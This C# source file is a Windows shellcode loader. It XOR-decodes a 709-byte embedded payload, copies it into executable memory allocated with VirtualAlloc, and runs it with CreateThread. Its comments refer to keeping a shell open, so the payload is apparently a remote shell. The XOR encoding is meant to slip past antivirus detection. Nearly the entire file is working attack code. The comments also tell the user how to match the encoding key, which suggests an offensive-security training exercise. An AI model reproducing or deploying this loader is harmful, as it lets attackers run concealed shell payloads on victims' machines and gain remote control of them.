using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.IO;

namespace StayAwhile
{
    class AndListen
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            //Keybyte - Make sure it's the same as you encoded it with.
            byte[] keyBytes = new byte[1] {0x22};

            // XOR encrypted shellcode
            byte[] OffSec = new byte[709] {
                0xde, 0x6a, 0xa1, 0xc6, 0xd2, 0xca, 0xee, 0x22, 0x22, 0x22, 0x63, 0x73, 0x63, 0x72, 0x70,
                0x73, 0x74, 0x6a, 0x13, 0xf0, 0x47, 0x6a, 0xa9, 0x70, 0x42, 0x6a, 0xa9, 0x70, 0x3a, 0x6a,
                0xa9, 0x70, 0x02, 0x6a, 0xa9, 0x50, 0x72, 0x6a, 0x2d, 0x95, 0x68, 0x68, 0x6f, 0x13, 0xeb,
                0x6a, 0x13, 0xe2, 0x8e, 0x1e, 0x43, 0x5e, 0x20, 0x0e, 0x02, 0x63, 0xe3, 0xeb, 0x2f, 0x63,
                0x23, 0xe3, 0xc0, 0xcf, 0x70, 0x63, 0x73, 0x6a, 0xa9, 0x70, 0x02, 0xa9, 0x60, 0x1e, 0x6a,
                0x23, 0xf2, 0x44, 0xa3, 0x5a, 0x3a, 0x29, 0x20, 0x2d, 0xa7, 0x50, 0x22, 0x22, 0x22, 0xa9,
                0xa2, 0xaa, 0x22, 0x22, 0x22, 0x6a, 0xa7, 0xe2, 0x56, 0x45, 0x6a, 0x23, 0xf2, 0x66, 0xa9,
                0x62, 0x02, 0x6b, 0x23, 0xf2, 0xa9, 0x6a, 0x3a, 0x72, 0xc1, 0x74, 0x6f, 0x13, 0xeb, 0x6a,
                0xdd, 0xeb, 0x63, 0xa9, 0x16, 0xaa, 0x6a, 0x23, 0xf4, 0x6a, 0x13, 0xe2, 0x8e, 0x63, 0xe3,
                0xeb, 0x2f, 0x63, 0x23, 0xe3, 0x1a, 0xc2, 0x57, 0xd3, 0x6e, 0x21, 0x6e, 0x06, 0x2a, 0x67,
                0x1b, 0xf3, 0x57, 0xfa, 0x7a, 0x66, 0xa9, 0x62, 0x06, 0x6b, 0x23, 0xf2, 0x44, 0x63, 0xa9,
                0x2e, 0x6a, 0x66, 0xa9, 0x62, 0x3e, 0x6b, 0x23, 0xf2, 0x63, 0xa9, 0x26, 0xaa, 0x63, 0x7a,
                0x6a, 0x23, 0xf2, 0x63, 0x7a, 0x7c, 0x7b, 0x78, 0x63, 0x7a, 0x63, 0x7b, 0x63, 0x78, 0x6a,
                0xa1, 0xce, 0x02, 0x63, 0x70, 0xdd, 0xc2, 0x7a, 0x63, 0x7b, 0x78, 0x6a, 0xa9, 0x30, 0xcb,
                0x69, 0xdd, 0xdd, 0xdd, 0x7f, 0x6a, 0x13, 0xf9, 0x71, 0x6b, 0x9c, 0x55, 0x4b, 0x4c, 0x4b,
                0x4c, 0x47, 0x56, 0x22, 0x63, 0x74, 0x6a, 0xab, 0xc3, 0x6b, 0xe5, 0xe0, 0x6e, 0x55, 0x04,
                0x25, 0xdd, 0xf7, 0x71, 0x71, 0x6a, 0xab, 0xc3, 0x71, 0x78, 0x6f, 0x13, 0xe2, 0x6f, 0x13,
                0xeb, 0x71, 0x71, 0x6b, 0x98, 0x18, 0x74, 0x5b, 0x85, 0x22, 0x22, 0x22, 0x22, 0xdd, 0xf7,
                0xca, 0x29, 0x22, 0x22, 0x22, 0x13, 0x12, 0x0c, 0x13, 0x0c, 0x13, 0x0c, 0x10, 0x17, 0x12,
                0x22, 0x78, 0x6a, 0xab, 0xe3, 0x6b, 0xe5, 0xe2, 0x99, 0x23, 0x22, 0x22, 0x6f, 0x13, 0xeb,
                0x71, 0x71, 0x48, 0x21, 0x71, 0x6b, 0x98, 0x75, 0xab, 0xbd, 0xe4, 0x22, 0x22, 0x22, 0x22,
                0xdd, 0xf7, 0xca, 0xbc, 0x22, 0x22, 0x22, 0x0d, 0x43, 0x4f, 0x47, 0x6a, 0x52, 0x58, 0x72,
                0x10, 0x41, 0x71, 0x4f, 0x10, 0x4b, 0x40, 0x47, 0x6e, 0x13, 0x6f, 0x48, 0x70, 0x1b, 0x63,
                0x71, 0x48, 0x56, 0x43, 0x78, 0x61, 0x6b, 0x6e, 0x4c, 0x7b, 0x4e, 0x74, 0x17, 0x66, 0x12,
                0x69, 0x73, 0x56, 0x11, 0x16, 0x15, 0x61, 0x73, 0x4e, 0x6e, 0x4c, 0x5b, 0x45, 0x10, 0x4e,
                0x6d, 0x13, 0x58, 0x4f, 0x46, 0x14, 0x4c, 0x71, 0x7a, 0x55, 0x40, 0x41, 0x7b, 0x5b, 0x17,
                0x4c, 0x7d, 0x66, 0x4b, 0x65, 0x68, 0x16, 0x78, 0x6a, 0x49, 0x6d, 0x74, 0x63, 0x7b, 0x71,
                0x63, 0x6f, 0x67, 0x12, 0x54, 0x13, 0x4a, 0x63, 0x65, 0x74, 0x63, 0x16, 0x41, 0x46, 0x57,
                0x53, 0x50, 0x4a, 0x6e, 0x1a, 0x1a, 0x5a, 0x6c, 0x44, 0x0f, 0x16, 0x76, 0x75, 0x4d, 0x66,
                0x6e, 0x54, 0x45, 0x7b, 0x48, 0x49, 0x0f, 0x11, 0x63, 0x74, 0x47, 0x7d, 0x4d, 0x43, 0x51,
                0x67, 0x41, 0x58, 0x73, 0x56, 0x4c, 0x75, 0x17, 0x4d, 0x15, 0x60, 0x13, 0x4a, 0x54, 0x4e,
                0x6a, 0x10, 0x57, 0x44, 0x52, 0x58, 0x16, 0x53, 0x6c, 0x61, 0x71, 0x14, 0x46, 0x69, 0x22,
                0x6a, 0xab, 0xe3, 0x71, 0x78, 0x63, 0x7a, 0x6f, 0x13, 0xeb, 0x71, 0x6a, 0x9a, 0x22, 0x10,
                0x8a, 0xa6, 0x22, 0x22, 0x22, 0x22, 0x72, 0x71, 0x71, 0x6b, 0xe5, 0xe0, 0xc9, 0x77, 0x0c,
                0x19, 0xdd, 0xf7, 0x6a, 0xab, 0xe4, 0x48, 0x28, 0x7d, 0x6a, 0xab, 0xd3, 0x48, 0x3d, 0x78,
                0x70, 0x4a, 0xa2, 0x11, 0x22, 0x22, 0x6b, 0xab, 0xc2, 0x48, 0x26, 0x63, 0x7b, 0x6b, 0x98,
                0x57, 0x64, 0xbc, 0xa4, 0x22, 0x22, 0x22, 0x22, 0xdd, 0xf7, 0x6f, 0x13, 0xe2, 0x71, 0x78,
                0x6a, 0xab, 0xd3, 0x6f, 0x13, 0xeb, 0x6f, 0x13, 0xeb, 0x71, 0x71, 0x6b, 0xe5, 0xe0, 0x0f,
                0x24, 0x3a, 0x59, 0xdd, 0xf7, 0xa7, 0xe2, 0x57, 0x3d, 0x6a, 0xe5, 0xe3, 0xaa, 0x31, 0x22,
                0x22, 0x6b, 0x98, 0x66, 0xd2, 0x17, 0xc2, 0x22, 0x22, 0x22, 0x22, 0xdd, 0xf7, 0x6a, 0xdd,
                0xed, 0x56, 0x20, 0xc9, 0x88, 0xca, 0x77, 0x22, 0x22, 0x22, 0x71, 0x7b, 0x48, 0x62, 0x78,
                0x6b, 0xab, 0xf3, 0xe3, 0xc0, 0x32, 0x6b, 0xe5, 0xe2, 0x22, 0x32, 0x22, 0x22, 0x6b, 0x98,
                0x7a, 0x86, 0x71, 0xc7, 0x22, 0x22, 0x22, 0x22, 0xdd, 0xf7, 0x6a, 0xb1, 0x71, 0x71, 0x6a,
                0xab, 0xc5, 0x6a, 0xab, 0xd3, 0x6a, 0xab, 0xf8, 0x6b, 0xe5, 0xe2, 0x22, 0x02, 0x22, 0x22,
                0x6b, 0xab, 0xdb, 0x6b, 0x98, 0x30, 0xb4, 0xab, 0xc0, 0x22, 0x22, 0x22, 0x22, 0xdd, 0xf7,
                0x6a, 0xa1, 0xe6, 0x02, 0xa7, 0xe2, 0x56, 0x90, 0x44, 0xa9, 0x25, 0x6a, 0x23, 0xe1, 0xa7,
                0xe2, 0x57, 0xf0, 0x7a, 0xe1, 0x7a, 0x48, 0x22, 0x7b, 0x99, 0xc2, 0x3f, 0x08, 0x28, 0x63,
                0xab, 0xf8, 0xdd, 0xf7 };

            // Decrypt by shifting to the left (-) as long as it's the opposite of what you encrypted with
            for (int i = 0; i < OffSec.Length; i++)
            {
                //OffSec[i] = (byte)(((uint)OffSec[i] - 2) & 0xFF);
                OffSec[i] = (byte)(OffSec[i]  ^ keyBytes[0]);
            };

            int size = OffSec.Length;
            // Allocate our memory buffer
            IntPtr va = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            // Copy of decrypted shellcode into the buffer
            Marshal.Copy(OffSec, 0, va, size);

            // Create a thread that contains our buffer
            IntPtr thread = CreateThread(IntPtr.Zero, 0, va, IntPtr.Zero, 0, IntPtr.Zero);

            // Ensure our thread doesn't exit until we close our shell
            WaitForSingleObject(thread, 0xFFFFFFFF);
        }
    }
}


